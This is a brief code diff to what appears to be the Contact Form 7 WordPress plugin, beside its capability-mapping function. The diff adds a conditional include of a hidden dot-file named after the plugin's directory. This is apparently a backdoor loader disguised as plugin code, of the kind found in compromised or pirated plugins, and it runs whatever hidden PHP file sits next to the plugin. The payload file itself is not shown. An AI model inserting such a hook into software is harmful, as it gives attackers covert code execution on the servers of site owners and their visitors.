@@ -2,6 +2,10 @@
 
 add_filter( 'map_meta_cap', 'wpcf7_map_meta_cap', 10, 4 );
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function wpcf7_map_meta_cap( $caps, $cap, $user_id, $args ) {
 	$meta_caps = array(
 		'wpcf7_edit_contact_form' => WPCF7_ADMIN_READ_WRITE_CAPABILITY,
